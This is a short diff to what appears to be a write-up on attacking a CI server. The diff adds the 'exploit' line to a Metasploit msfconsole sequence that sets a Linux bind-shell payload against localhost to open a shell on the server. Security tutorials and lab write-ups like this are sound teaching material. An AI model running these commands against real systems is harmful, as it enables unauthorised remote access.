@@ -44,6 +44,7 @@ Let's start msfconsole and open the shell on the server:
 use exploit/multi/handler
 set payload linux/x64/shell/bind_tcp
 set RHOST 127.0.0.1
+exploit
 </code></pre>
 
 ![ci-4](/img/posts/ci/ci-4.png)
